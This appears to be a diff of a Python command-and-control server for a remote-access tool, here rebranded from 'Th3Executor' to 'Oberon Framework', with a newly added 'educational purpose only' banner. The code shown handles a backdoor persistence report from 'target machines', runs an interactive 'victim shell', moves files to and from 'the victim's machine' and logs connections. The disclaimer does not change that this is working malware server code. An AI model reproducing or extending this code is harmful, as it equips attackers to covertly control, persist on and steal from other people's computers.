@@ -1,3 +1,23 @@
+"""
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                           OBERON FRAMEWORK - C2 SERVER                        ║
+║                                                                               ║
+║                        ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️                         ║
+║                                                                               ║
+║  This software is developed exclusively for EDUCATIONAL PURPOSES,            ║
+║  AUTHORIZED PENETRATION TESTING, and SECURITY RESEARCH in controlled         ║
+║  environments.                                                                ║
+║                                                                               ║
+║  ✅ Use ONLY on systems you own or have explicit written permission to test   ║
+║  ✅ Intended for learning cybersecurity concepts and defensive strategies     ║
+║  ❌ Any unauthorized or malicious use is STRICTLY PROHIBITED                  ║
+║  ❌ Do NOT use this tool for illegal activities or unauthorized access        ║
+║                                                                               ║
+║  YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS.                                ║
+║  The developers assume NO LIABILITY for misuse of this framework.            ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+"""
+
 # Cyrptographic Libraries
 from Crypto.Util.number import getPrime, getRandomNBitInteger
 from Crypto.Protocol.KDF import HKDF
@@ -125,7 +145,7 @@ def decrypt_message(encrypted_message):
 
 # KEEP IN THIS FILE
 def print_help_menu(commands):
-    banner = colored('\nT H 3 E X E C U T O R   H E L P   M E N U', 'red', attrs=['bold', 'dark'])
+    banner = colored('\nO B E R O N   F R A M E W O R K   H E L P   M E N U', 'red', attrs=['bold', 'dark'])
     print(banner)
     print(colored('-' * 65, 'red')) 
     descriptions = {
@@ -178,11 +198,11 @@ def persist_del_command(client_output):
     
     return colored("[-] Unable to parse persistance output. This operation may or may not have worked", "red")
 
-def persist_command(client_output):  
+def persist_command(client_output):
     decrypted_client_message = decrypt_message(client_output).decode()
     if decrypted_client_message == "created":
-        log_activity("Th3Executor backdoor installed successfully on target machine. Persistance is now active.", "info")
-        return colored("[+] Th3Executor backdoor installed successfully on target machine. Persistance is now active", "green")
+        log_activity("Oberon Framework backdoor installed successfully on target machine. Persistance is now active.", "info")
+        return colored("[+] Oberon Framework backdoor installed successfully on target machine. Persistance is now active", "green")
     elif decrypted_client_message == "not_windows":
         log_activity("Target is not using a windows machine, persistance will not work.", "error")
         return colored("[-] Target is not using a windows machine, persistance will not work", "red")
@@ -447,7 +467,7 @@ def process_shell_prompt(output, conn_obj):
 
     except:
         print(f"[-] Unable to establish current shell path, using default placeholder instead")
-        shell_prompt = "th3executor_victim_shell > "
+        shell_prompt = "oberon_victim_shell > "
 
     return shell_prompt
 
@@ -466,8 +486,8 @@ def shell_command(client_output, conn_obj):
             shell_banner()
             continue
         elif usr_input == "quit" or usr_input == "exit":
-            clear_socket_buffer(conn_obj) 
-            print("Redirecting you back to th3executor . . .")
+            clear_socket_buffer(conn_obj)
+            print("Redirecting you back to Oberon Framework . . .")
             time.sleep(1.5)
             clear_screen()
             intro_banner()
@@ -551,8 +571,8 @@ def download(conn_obj, usr_input):
 
 def shell_banner():
     banner = colored(ascii_art.oberon_main_banner_3, attrs=["bold"])
-    text = colored("\n- Embrace Power - Command and Conquer with Th3executor \n", attrs=["dark"]) 
-       
+    text = colored("\n- Silence the Noise, Amplify the Impact \n", attrs=["dark"])
+
     print(banner + text)
 
 def shell_cheat_sheet():
@@ -601,7 +621,7 @@ def shell_help():
         "upload <file_path>": "Upload a file to the victim's machine",
         "help": "Display this help menu",
         "commands_help": "Display a windows and linux shell cheat sheet",
-        "exit": "Exit the shell and return to th3executor"
+        "exit": "Exit the shell and return to Oberon Framework"
     }
     
     for command, description in descriptions.items():
@@ -620,20 +640,20 @@ def shell_load(client_output, conn_obj):
 def disconnect_target(conn_obj, shutdown_signal):
     try:
         conn_obj.close()
-        log_activity("Exited th3executor, connection terminated successfully on server end", "info")
+        log_activity("Exited Oberon Framework, connection terminated successfully on server end", "info")
     except Exception as err:
         print("[-] Program ended abruptly, no connection was probably established with target")
-        log_activity(f"Exited th3executor, could not terminate connection on server side -> {err}", "error")
+        log_activity(f"Exited Oberon Framework, could not terminate connection on server side -> {err}", "error")
 
     if not shutdown_signal or shutdown_signal == "connection_not_closed":
         print(colored("[-] Target did not terminate the connection on their end", "red"))
         print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
-        
-        log_activity("Exited th3executor, connection was not terminated on targets end.", "error")
+
+        log_activity("Exited Oberon Framework, connection was not terminated on targets end.", "error")
     elif shutdown_signal == "shutdown_confirmed":
         print(colored("[+] Connection terminated successfully on targets end", "green"))
-        
-        log_activity("Exited th3executor, connection terminated normally between both parties.", "info")
+
+        log_activity("Exited Oberon Framework, connection terminated normally between both parties.", "info")
     else:
         print(colored("[-] Unknown shutdown code retireved, unable to parse output. Connection is probably still open", "red"))
         print(colored("[!] This can be due to a network problem, please wait a few moments before re-connecting", "yellow"))
